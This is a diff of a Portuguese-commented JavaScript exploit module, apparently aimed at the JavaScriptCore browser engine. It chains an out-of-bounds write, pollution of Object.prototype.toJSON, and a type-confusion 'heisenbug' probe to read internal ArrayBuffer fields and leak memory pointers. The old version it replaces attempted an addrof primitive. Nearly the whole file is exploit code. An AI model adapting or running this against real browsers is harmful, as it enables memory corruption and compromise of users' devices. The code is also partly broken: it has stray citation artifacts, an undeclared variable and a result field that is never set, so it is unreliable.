@@ -1,204 +1,237 @@
-// js/script3/testArrayBufferVictimCrash.mjs (Integrando Addrof na Heisenbug Estável)
-import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs'; [cite: 465]
+
+// js/script3/testArrayBufferVictimCrash.mjs (Sonda Agressiva para Vazamento de Campos Internos)
+import { logS3, PAUSE_S3 } from './s3_utils.mjs';
+import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     oob_array_buffer_real,
     oob_write_absolute,
-    clearOOBEnvironment
-    // isOOBReady não é usado diretamente neste script, mas triggerOOB_primitive pode usá-lo internamente
+    clearOOBEnvironment,
+    isOOBReady
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-// Nome do módulo atualizado para refletir a nova tentativa
-export const FNAME_MODULE_V28 = "ArrayBufferVictim_StableHeisenbug_Addrof_v1";
+export const FNAME_MODULE_V28 = "Heisenbug_AggressiveInternalLeak_v1_Run2"; // Indicando nova execução
 
-const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF; [cite: 466]
-const VICTIM_AB_SIZE = 64; [cite: 466]
+const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
+const VICTIM_AB_SIZE = 64;
+const CORRUPTION_TARGET_OFFSET_FOR_HEISENBUG = 0x7C;
 
-// Variáveis globais para a sonda toJSON e resultados do addrof
 let toJSON_call_details_v28 = null;
-let victim_ab_ref_for_original_test = null; // Para a sonda verificar se 'this' é o objeto certo
-let object_to_leak_for_addrof_attempt = null; // Objeto cujo endereço queremos vazar
-let write_attempted_in_probe = false; // Flag para indicar se a escrita do addrof foi tentada
+let victim_ab_ref_for_probe = null;
+let aggressive_probe_results_collector = {}; // Coletor para esta execução
 
-// Sonda toJSON_V28_MinimalProbe, agora com tentativa de escrita para addrof
-function toJSON_V28_Probe_For_Addrof() {
-    // Inicializa/reseta os detalhes para esta chamada da sonda.
-    // A variável global toJSON_call_details_v28 será atualizada se 'this' for o nosso victim_ab.
-    let local_details = {
-        probe_variant: "V28_Probe_For_Addrof_v1",
-        this_type_in_toJSON: "N/A_before_call",
-        error_in_toJSON: null,
-        probe_called: true
+function AggressiveInternalLeakProbe() {
+    const FNAME_PROBE = "AggressiveInternalLeakProbe";
+    let current_this_type_at_call = Object.prototype.toString.call(this);
+    
+    // Inicializa/reseta os resultados locais para ESTA chamada da sonda.
+    // A variável de módulo aggressive_probe_results_collector será atualizada APENAS se this for o victim_ab.
+    let local_probe_interactions = {
+        type_at_probe_call: current_this_type_at_call,
+        heisenbug_condition_met_for_reads: false,
+        read_prop_slot0: "N/A",
+        read_prop_slot1: "N/A",
+        read_prop_slot2: "N/A",
+        read_byteLength_prop: "N/A",
+        read_buffer_prop: "N/A", // Comum em TypedArrays, não em ArrayBuffer diretamente
+        errors: []
     };
 
-    try {
-        local_details.this_type_in_toJSON = Object.prototype.toString.call(this);
+    // Atualiza a estrutura global toJSON_call_details_v28 para logging externo consistente
+    toJSON_call_details_v28 = {
+        probe_variant: FNAME_MODULE_V28, // Usa o nome do módulo do teste
+        this_type_in_toJSON: current_this_type_at_call,
+        error_in_toJSON: null, // Erros gerais da sonda
+        probe_called_on_victim: (this === victim_ab_ref_for_probe),
+        detailed_probe_interactions: {} // Será preenchido se for o victim_ab
+    };
 
-        if (this === victim_ab_ref_for_original_test) {
-            // Atualiza a variável global apenas se 'this' for o nosso victim_ab
-            toJSON_call_details_v28 = local_details;
-            logS3(`[toJSON_Probe_For_Addrof] 'this' é victim_ab. Tipo de 'this': ${local_details.this_type_in_toJSON}`, "leak");
+    if (this === victim_ab_ref_for_probe) {
+        logS3(`[${FNAME_PROBE}] Iniciando para VICTIM_AB. Tipo verificado: ${current_this_type_at_call}`, "leak");
 
-            if (local_details.this_type_in_toJSON === '[object Object]') {
-                logS3(`[toJSON_Probe_For_Addrof] HEISENBUG CONFIRMADA PARA VICTIM_AB! Tentando escrever object_to_leak em this[0]...`, "vuln");
-                if (object_to_leak_for_addrof_attempt) {
-                    this[0] = object_to_leak_for_addrof_attempt; // A escrita crucial!
-                    write_attempted_in_probe = true; // Marca que a escrita foi tentada
-                    logS3(`[toJSON_Probe_For_Addrof] Escrita de referência em this[0] (supostamente) realizada.`, "info");
-                } else {
-                    logS3(`[toJSON_Probe_For_Addrof] object_to_leak_for_addrof_attempt é null. Escrita não tentada.`, "warn");
-                }
-            } else {
-                logS3(`[toJSON_Probe_For_Addrof] Heisenbug NÃO confirmada para victim_ab. Tipo de 'this': ${local_details.this_type_in_toJSON}`, "warn");
+        if (current_this_type_at_call === '[object Object]') {
+            local_probe_interactions.heisenbug_condition_met_for_reads = true;
+            logS3(`[${FNAME_PROBE}] HEISENBUG ATIVA PARA VICTIM_AB! Tipo: [object Object]. Tentando leituras agressivas...`, "vuln");
+
+            try {
+                // Slots especulativos do "butterfly" (que é m_impl, apontando para ArrayBufferContents)
+                // Os nomes p0, p1, p2 são para tentar acessar índices 0, 1, 2 do butterfly.
+                // Se cada slot do butterfly for 8 bytes (um JSValue):
+                //  this.p0 -> *(m_impl + 0*8) -> m_firstView/m_refCount + parte do próximo campo
+                //  this.p1 -> *(m_impl + 1*8) -> m_size (se alinhado) + parte do próximo campo (m_data)
+                //  this.p2 -> *(m_impl + 2*8) -> m_data (se alinhado) + parte do próximo campo
+                // Os offsets REAIS dentro de ArrayBufferContents são cruciais:
+                // JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START (ex: 0x08)
+                // JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START (ex: 0x10)
+
+                const prop_slot0 = this.p0; // Tenta ler o que seria o slot 0 do butterfly
+                local_probe_interactions.read_prop_slot0 = isAdvancedInt64Object(prop_slot0) ? prop_slot0.toString(true) : String(prop_slot0);
+                logS3(`  [${FNAME_PROBE}] this.p0 (Conteúdo de m_impl[0]?) lido como: ${local_probe_interactions.read_prop_slot0}`, "leak");
+
+                const prop_slot1 = this.p1; // Tenta ler o que seria o slot 1 do butterfly (m_impl + 8)
+                local_probe_interactions.read_prop_slot1 = isAdvancedInt64Object(prop_slot1) ? prop_slot1.toString(true) : String(prop_slot1);
+                logS3(`  [${FNAME_PROBE}] this.p1 (Conteúdo de m_impl[8]?, m_size?) lido como: ${local_probe_interactions.read_prop_slot1}`, "leak");
+                
+                const prop_slot2 = this.p2; // Tenta ler o que seria o slot 2 do butterfly (m_impl + 16)
+                local_probe_interactions.read_prop_slot2 = isAdvancedInt64Object(prop_slot2) ? prop_slot2.toString(true) : String(prop_slot2);
+                logS3(`  [${FNAME_PROBE}] this.p2 (Conteúdo de m_impl[16]?, m_data?) lido como: ${local_probe_interactions.read_prop_slot2}`, "leak");
+
+                local_probe_interactions.read_byteLength_prop = String(this.byteLength);
+                logS3(`  [${FNAME_PROBE}] this.byteLength (confuso) lido como: ${local_probe_interactions.read_byteLength_prop}`, "leak");
+                
+                // 'buffer' é uma propriedade de TypedArrays, não de ArrayBuffer. Pode dar erro ou undefined.
+                try { local_probe_interactions.read_buffer_prop = String(this.buffer); } catch(e){ local_probe_interactions.read_buffer_prop = `Error: ${e.name}`; }
+                logS3(`  [${FNAME_PROBE}] this.buffer (confuso) lido como: ${local_probe_interactions.read_buffer_prop}`, "leak");
+
+            } catch (e_read) {
+                const errorMsg = `Erro na leitura agressiva: ${e_read.name} - ${e_read.message}`;
+                local_probe_interactions.errors.push(errorMsg);
+                toJSON_call_details_v28.error_in_toJSON = errorMsg;
+                logS3(`[${FNAME_PROBE}] ${errorMsg}`, "error");
             }
+        } else {
+            logS3(`[${FNAME_PROBE}] Heisenbug NÃO ATIVA para victim_ab no momento da tentativa de leitura. Tipo: ${current_this_type_at_call}`, "warn");
         }
-    } catch (e) {
-        local_details.error_in_toJSON = `${e.name}: ${e.message}`;
-        if (this === victim_ab_ref_for_original_test) { // Se o erro foi no nosso victim_ab, atualiza global
-            toJSON_call_details_v28 = local_details;
-        }
-        logS3(`[toJSON_Probe_For_Addrof] ERRO na sonda: ${e.name} - ${e.message}`, "error");
+        // Atualiza o coletor global APENAS se for o victim_ab
+        aggressive_probe_results_collector = local_probe_interactions;
+        toJSON_call_details_v28.detailed_probe_interactions = aggressive_probe_results_collector;
     }
-    return { minimal_probe_executed: true, type_observed_by_this_call: local_details.this_type_in_toJSON };
+    
+    // Atualiza o tipo final em toJSON_call_details_v28 para o runner externo
+    toJSON_call_details_v28.this_type_in_toJSON = Object.prototype.toString.call(this); 
+
+    return { 
+        probe_run_variant: FNAME_MODULE_V28, 
+        final_type_observed: toJSON_call_details_v28.this_type_in_toJSON,
+        heisenbug_active_during_rw: local_probe_interactions.heisenbug_condition_met_for_reads // Retorna o status local da condição
+    };
 }
 
-
 export async function executeArrayBufferVictimCrashTest() {
-    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Addrof sobre Heisenbug Estável ---`, "test", FNAME_CURRENT_TEST);
+    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAggressiveLeak`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Tentativa de Leak Agressivo via Heisenbug JSON (v1 Run2) ---`, "test", FNAME_CURRENT_TEST);
     document.title = `${FNAME_MODULE_V28} Inic...`;
 
-    // Resetar variáveis globais do teste
-    toJSON_call_details_v28 = null;
-    victim_ab_ref_for_original_test = null;
-    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObjectForStableAddrof" };
-    write_attempted_in_probe = false;
+    toJSON_call_details_v28 = null; // Para o runner
+    victim_ab_ref_for_probe = null;
+    aggressive_probe_results_collector = {}; // Resetar coletor de resultados da sonda
+    object_to_assign_in_probe = null; // Não estamos tentando assignar neste teste, apenas ler
 
     let errorCapturedMain = null;
     let stringifyOutput = null;
-    let addrof_result = {
+    let exploit_result = {
         success: false,
-        leaked_address_as_double: null,
-        leaked_address_as_int64: null,
-        message: "Addrof não tentado ou Heisenbug não ocorreu na sonda para o victim_ab."
+        heisenbug_detected_externally: false,
+        probe_results_summary: null, // Para armazenar um resumo do aggressive_probe_results_collector
+        message: "Exploração não iniciada."
     };
     
-    // Usar o offset 0x7C, que funcionou consistentemente nos logs para a Heisenbug
-    const corruptionTargetOffsetInOOBAB = 0x7C; [cite: 463, 517]
-    const fillPattern = 0.123456789101112; // Padrão de preenchimento do log original
-
     try {
         await triggerOOB_primitive({ force_reinit: true });
-        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); } [cite: 468]
-        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST); [cite: 517]
-        logS3(`   Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST); [cite: 517]
+        if (!isOOBReady()) { throw new Error("OOB Init falhou ou m_length não expandido."); }
+        logS3("Ambiente OOB inicializado e m_length expandido.", "info", FNAME_CURRENT_TEST);
 
-        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST); [cite: 517]
-        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4); [cite: 468]
-        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST); [cite: 517]
+        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(CORRUPTION_TARGET_OFFSET_FOR_HEISENBUG)}]...`, "warn", FNAME_CURRENT_TEST);
+        oob_write_absolute(CORRUPTION_TARGET_OFFSET_FOR_HEISENBUG, CRITICAL_OOB_WRITE_VALUE, 4);
+        logS3(`  Escrita OOB crítica realizada.`, "info", FNAME_CURRENT_TEST);
         
-        await PAUSE_S3(100); [cite: 468]
+        await PAUSE_S3(100); 
 
-        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE); [cite: 468]
-        let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
-        float64_view_on_victim.fill(fillPattern); 
-
-        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_on_victim[0]}. Tentando JSON.stringify com ${toJSON_V28_Probe_For_Addrof.name}...`, "test", FNAME_CURRENT_TEST); [cite: 518]
+        victim_ab_ref_for_probe = new ArrayBuffer(VICTIM_AB_SIZE);
+        // Não precisamos de Float64Array view aqui, pois não estamos verificando o buffer externamente para addrof.
+        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE}) criado. Tentando JSON.stringify com ${AggressiveInternalLeakProbe.name}...`, "test", FNAME_CURRENT_TEST);
         
         const ppKey = 'toJSON';
-        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); [cite: 469]
+        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
         let pollutionApplied = false;
 
         try {
             Object.defineProperty(Object.prototype, ppKey, {
-                value: toJSON_V28_Probe_For_Addrof,
+                value: AggressiveInternalLeakProbe,
                 writable: true, configurable: true, enumerable: false
             });
             pollutionApplied = true;
-            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V28_Probe_For_Addrof.name}.`, "info", FNAME_CURRENT_TEST); [cite: 518]
-
-            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)... (Ponto esperado da Heisenbug e escrita para addrof)`, "warn", FNAME_CURRENT_TEST); [cite: 518]
-            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test); 
             
-            logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Resultado (da sonda): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST); [cite: 518]
-            // toJSON_call_details_v28 agora é preenchido pela sonda se this === victim_ab_ref_for_original_test
-            logS3(`  Detalhes da sonda (toJSON_call_details_v28): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A (sonda não chamada para victim_ab?)'}`, "leak", FNAME_CURRENT_TEST); [cite: 594]
-            logS3(`  Flag de tentativa de escrita pela sonda (write_attempted_in_probe): ${write_attempted_in_probe}`, write_attempted_in_probe ? "good" : "warn", FNAME_CURRENT_TEST);
+            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_probe)...`, "warn", FNAME_CURRENT_TEST);
+            stringifyOutput = JSON.stringify(victim_ab_ref_for_probe); 
+            logS3(`  JSON.stringify completou. Saída stringify: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
+            
+            // Logar os detalhes coletados pela sonda (que foram armazenados em aggressive_probe_results_collector)
+            // e o toJSON_call_details_v28 final
+            logS3(`  Detalhes FINAIS da Sonda (toJSON_call_details_v28): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
+            exploit_result.probe_results_summary = JSON.parse(JSON.stringify(aggressive_probe_results_collector)); // Copia os resultados da sonda
 
-            // A verificação principal: Heisenbug ocorreu E a escrita foi tentada pela sonda
-            if (toJSON_call_details_v28 && toJSON_call_details_v28.this_type_in_toJSON === "[object Object]" && write_attempted_in_probe) {
-                logS3(`  HEISENBUG CONFIRMADA E ESCRITA TENTADA PELA SONDA! Verificando buffer...`, "vuln", FNAME_CURRENT_TEST); [cite: 581]
+            exploit_result.heisenbug_detected_externally = (toJSON_call_details_v28 && toJSON_call_details_v28.this_type_in_toJSON === '[object Object]');
+            logS3(`  Heisenbug ocorreu (conforme toJSON_call_details_v28.this_type_in_toJSON): ${exploit_result.heisenbug_detected_externally}`, exploit_result.heisenbug_detected_externally ? "vuln" : "warn", FNAME_CURRENT_TEST);
+
+            if (exploit_result.heisenbug_detected_externally && aggressive_probe_results_collector.heisenbug_condition_met_for_reads) {
+                logS3("PASSO 3: Heisenbug confirmada PELA SONDA! Analisando leituras agressivas...", "warn", FNAME_CURRENT_TEST);
                 
-                logS3("PASSO 3: Verificando float64_view_on_victim[0] APÓS Heisenbug e tentativa de escrita na sonda...", "warn", FNAME_CURRENT_TEST); [cite: 519]
-                const value_read_as_double = float64_view_on_victim[0]; [cite: 519]
-                addrof_result.leaked_address_as_double = value_read_as_double;
-                logS3(`  Valor lido de float64_view_on_victim[0]: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST); [cite: 519]
+                // Tentar converter e analisar os valores lidos em aggressive_probe_results_collector
+                let p0_val = aggressive_probe_results_collector.read_prop_slot0;
+                let p1_val = aggressive_probe_results_collector.read_prop_slot1;
+                let p2_val = aggressive_probe_results_collector.read_prop_slot2;
 
-                const double_buffer_for_conversion = new ArrayBuffer(8); [cite: 582]
-                (new Float64Array(double_buffer_for_conversion))[0] = value_read_as_double;
-                const int32_view_for_double_conversion = new Uint32Array(double_buffer_for_conversion);
-                addrof_result.leaked_address_as_int64 = new AdvancedInt64(int32_view_for_double_conversion[0], int32_view_for_double_conversion[1]);
-                logS3(`  Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST); [cite: 519]
+                // Exemplo: Se this.p2 (slot 2) vazou m_data, ele deve ser um ponteiro não nulo.
+                // (Esta lógica de conversão e verificação de ponteiro precisaria ser robusta)
+                let potential_m_data_ptr = null;
+                if (p2_val && p2_val !== "N/A" && !String(p2_val).startsWith("Error")) {
+                    try {
+                        if (String(p2_val).startsWith("0x")) { potential_m_data_ptr = new AdvancedInt64(p2_val); }
+                        else {
+                            const p2_dbl = parseFloat(p2_val);
+                            if(!isNaN(p2_dbl)) {
+                                const ab = new ArrayBuffer(8); new Float64Array(ab)[0] = p2_dbl; const u32 = new Uint32Array(ab);
+                                potential_m_data_ptr = new AdvancedInt64(u32[0], u32[1]);
+                            }
+                        }
+                    } catch(e_conv) { logS3(`Erro convertendo p2_val: ${e_conv}`, "error");}
+                }
 
-                if (value_read_as_double !== 0 && value_read_as_double !== fillPattern &&
-                    (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) { [cite: 583]
-                    logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST); [cite: 583]
-                    addrof_result.success = true;
-                    addrof_result.message = "Heisenbug confirmada, escrita tentada pela sonda, E leitura de double sugere um ponteiro.";
-                    document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
+                if (potential_m_data_ptr && (potential_m_data_ptr.low() !== 0 || potential_m_data_ptr.high() !== 0)) {
+                    exploit_result.success = true;
+                    exploit_result.message = `LEAK POTENCIAL! Heisenbug OK, e this.p2 retornou: ${potential_m_data_ptr.toString(true)}`;
+                    document.title = `${FNAME_MODULE_V28}: Leak m_data? ${potential_m_data_ptr.toString(true)}`;
                 } else {
-                    addrof_result.message = "Heisenbug confirmada e escrita tentada, mas valor lido não parece ponteiro ou buffer não foi alterado."; [cite: 584]
-                    logS3(`  INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double})`, "warn", FNAME_CURRENT_TEST); [cite: 584]
-                    document.title = `${FNAME_MODULE_V28}: Heisenbug OK, Addr Falhou`; [cite: 584]
+                    exploit_result.message = "Heisenbug ocorreu, leituras agressivas feitas, mas nenhum vazamento claro de m_data via this.p2.";
+                    document.title = `${FNAME_MODULE_V28}: TC OK, No Leak m_data`;
                 }
+                
             } else {
-                let msg = "Condições para addrof não totalmente atendidas.";
-                if (!toJSON_call_details_v28 || toJSON_call_details_v28.this_type_in_toJSON !== "[object Object]") {
-                    msg += ` Heisenbug (this como [object Object]) não foi confirmada via toJSON_call_details_v28. Tipo obs: ${toJSON_call_details_v28 ? toJSON_call_details_v28.this_type_in_toJSON : "N/A"}.`;
-                } else if (!write_attempted_in_probe) {
-                    msg += " Heisenbug confirmada, mas escrita não foi (ou não foi marcada como) tentada pela sonda.";
-                }
-                addrof_result.message = msg;
-                logS3(`  ALERTA: ${addrof_result.message}`, "error", FNAME_CURRENT_TEST);
-                document.title = `${FNAME_MODULE_V28}: Addrof PreCond Falhou`;
+                exploit_result.message = `Heisenbug não confirmada PELA SONDA no momento das leituras (${aggressive_probe_results_collector.heisenbug_condition_met_for_reads}), ou não detectada externamente. Tipo final em toJSON_call_details_v28: ${toJSON_call_details_v28 ? toJSON_call_details_v28.this_type_in_toJSON : 'N/A'}.`;
+                document.title = `${FNAME_MODULE_V28}: Heisenbug Falhou para Agressividade`;
             }
+            logS3(`  ${exploit_result.message}`, exploit_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
 
         } catch (e_str) {
             errorCapturedMain = e_str;
-            logS3(`   ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST); [cite: 585]
-            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`; [cite: 585]
-            addrof_result.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
+            exploit_result.message = `ERRO CRÍTICO durante JSON.stringify: ${e_str.name} - ${e_str.message}`;
         } finally {
             if (pollutionApplied) {
-                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); [cite: 586]
+                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                 else delete Object.prototype[ppKey];
             }
         }
-
     } catch (e_outer_main) {
         errorCapturedMain = e_outer_main;
-        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST); [cite: 587]
-        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
-        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`; [cite: 587]
-        addrof_result.message = `Erro geral no teste: ${e_outer_main.name}`;
+        exploit_result.message = `ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`;
     } finally {
-        clearOOBEnvironment(); [cite: 587]
-        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST); [cite: 587]
-        logS3(`Resultado Addrof: Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST); [cite: 587]
-        if(addrof_result.leaked_address_as_int64 && (addrof_result.leaked_address_as_int64.low() !==0 || addrof_result.leaked_address_as_int64.high() !==0)){
-            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST); [cite: 587]
+        clearOOBEnvironment();
+        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
+        logS3(`Resultado Exploração Agressiva: Success=${exploit_result.success}, Msg='${exploit_result.message}'`, exploit_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
+        logS3(`  Resultados Detalhados da Sonda (aggressive_probe_results_collector): ${JSON.stringify(aggressive_probe_results_collector)}`, "leak", FNAME_CURRENT_TEST);
+        if(exploit_result.leaked_m_data_ptr_candidate){ // Corrigido para usar a variável correta
+            logS3(`  Candidato a m_data (Int64): ${exploit_result.leaked_m_data_ptr_candidate.toString(true)}`, "leak", FNAME_CURRENT_TEST);
         }
-        object_to_leak_for_addrof_attempt = null;
-        victim_ab_ref_for_original_test = null;
-        toJSON_call_details_v28 = null; // Limpar para próxima execução, se houver
+        
+        victim_ab_ref_for_probe = null;
+        aggressive_probe_results_collector = {}; 
     }
+    
     return { 
         errorOccurred: errorCapturedMain, 
-        potentiallyCrashed: false, 
-        stringifyResult: stringifyOutput, 
-        toJSON_details: toJSON_call_details_v28,
-        addrof_attempt_result: addrof_result 
+        toJSON_details: toJSON_call_details_v28, // Este é o objeto global atualizado pela última chamada da sonda
+        exploit_attempt_result: exploit_result // Contém os resultados da análise e aggressive_probe_results_collector
     };
 }
